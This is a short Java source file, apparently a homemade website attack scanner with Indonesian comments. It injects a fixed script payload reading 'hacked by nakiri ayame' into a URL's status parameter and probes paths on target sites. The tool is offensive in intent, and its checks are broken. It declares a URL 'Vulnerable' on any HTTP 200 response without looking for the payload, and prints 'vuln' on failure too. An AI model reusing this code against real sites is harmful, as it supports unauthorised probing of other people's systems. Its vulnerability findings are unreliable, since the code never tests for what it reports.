import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;


public class CheckWebsitePaths {
    private static final String FIXED_XSS_PAYLOAD = "<script>alert(\"hacked by nakiri ayame\")</script>";
    
    public static void checkPath(String websiteUrl, String path) {
        try {
            URL url = new URL(websiteUrl + path);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");

            int responseCode = connection.getResponseCode();

            if (responseCode == HttpURLConnection.HTTP_OK) {
                System.out.println("Path " + path + " exists on " + websiteUrl);
                System.out.println("Vulnerable URL: " + url);
            } else {
                System.out.println("Path " + path + " does not exist on " + websiteUrl);
            }

        } catch (IOException e) {
            System.out.println("Error checking path " + path + " on " + websiteUrl + ": " + e.getMessage());
        }
    }

    // Fungsi yang mencoba mengidentifikasi kerentanan XSS pada URL menggunakan payload
    public static void xssfind(String websiteUrl, String payload) {
        try {
            URL url = new URL(websiteUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
    
            int responseCode = connection.getResponseCode();
    
            if (responseCode == HttpURLConnection.HTTP_OK) {
                System.out.println("Vulnerable URL: " + websiteUrl + payload);
            } else {
                System.out.println("vuln : " + websiteUrl);
            }
    
        } catch (IOException e) {
            System.out.println("Error checking path on " + websiteUrl + ": " + e.getMessage());
        }
    }
    
    // Fungsi untuk menggunakan NobaraXSS dengan payload tetap
    public static void useNobaraXSS(String websiteUrl) {
        // Ubah status parameter dengan payload XSS
        String xssUrl = websiteUrl.replace("status=good", "status=" + FIXED_XSS_PAYLOAD);
        // Panggil fungsi xssfind dengan payload yang telah diubah
        xssfind(xssUrl, FIXED_XSS_PAYLOAD);
    }
    
    
}
